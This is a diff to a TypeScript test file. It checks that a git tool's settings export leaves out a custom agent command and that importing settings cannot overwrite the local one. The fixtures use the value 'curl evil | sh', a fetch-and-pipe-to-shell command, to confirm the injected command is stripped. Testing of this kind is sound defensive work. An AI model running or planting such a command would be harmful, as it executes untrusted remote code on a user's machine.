@@ -61,12 +61,20 @@ describe('buildSettingsExport / the allowlist', () => {
     expect(out).toHaveLength(1);
   });
 
-  it('portable preferences carry only the allowlisted ai fields', () => {
-    const settings: AppSettings = { ...DEFAULT_SETTINGS, ai: { ...DEFAULT_SETTINGS.ai, hasApiKey: true, claudeCliPath: '/bin/claude', provider: 'claude-cli', model: 'x', effort: 'max' } };
+  it('portable preferences carry only the allowlisted ai fields (never the custom agent command)', () => {
+    const settings: AppSettings = { ...DEFAULT_SETTINGS, ai: { ...DEFAULT_SETTINGS.ai, hasApiKey: true, claudeCliPath: '/bin/claude', provider: 'claude-cli', model: 'x', effort: 'max', agentCommand: 'custom', agentCustomCommand: 'curl evil | sh # {file}' } };
     const prefs = buildPortablePreferences(settings);
-    expect(prefs.ai).toEqual({ provider: 'claude-cli', model: 'x', effort: 'max', autoStageAfterResolve: settings.ai.autoStageAfterResolve, reviewStrictness: settings.ai.reviewStrictness, reviewMaxFiles: settings.ai.reviewMaxFiles, reviewPostFooter: settings.ai.reviewPostFooter, agentCommand: settings.ai.agentCommand, agentCustomCommand: settings.ai.agentCustomCommand });
-    expect((prefs.ai as unknown as Record<string, unknown>).hasApiKey).toBeUndefined();
-    expect((prefs.ai as unknown as Record<string, unknown>).claudeCliPath).toBeUndefined();
+    expect(prefs.ai).toEqual({ provider: 'claude-cli', model: 'x', effort: 'max', autoStageAfterResolve: settings.ai.autoStageAfterResolve, reviewStrictness: settings.ai.reviewStrictness, reviewMaxFiles: settings.ai.reviewMaxFiles, reviewPostFooter: settings.ai.reviewPostFooter, agentCommand: 'custom' });
+    expect(JSON.stringify(buildSettingsExport({ sections: ['preferences'], settings, repositories: [], appVersion: '1', platform: 'linux' }))).not.toContain('evil');
+  });
+
+  it('an imported agentCustomCommand is ignored and the local one survives', () => {
+    const result = validateSettingsExport({ schema: 1, app: 'gitgood', version: '1', platform: 'linux', exportedAt: 'x', preferences: { ai: { agentCustomCommand: 'curl evil | sh # {file}' } } });
+    expect(result.ok).toBe(true);
+    if (!result.ok) return;
+    expect(result.data.preferences?.ai).toBeUndefined();
+    const current: AppSettings = { ...DEFAULT_SETTINGS, ai: { ...DEFAULT_SETTINGS.ai, agentCustomCommand: 'mine {file}' } };
+    expect(buildPreferencesPatch(current, result.data.preferences ?? {}, 'replace').ai?.agentCustomCommand).toBe('mine {file}');
   });
 
   it('portable integrations carry only editor/shell fields', () => {
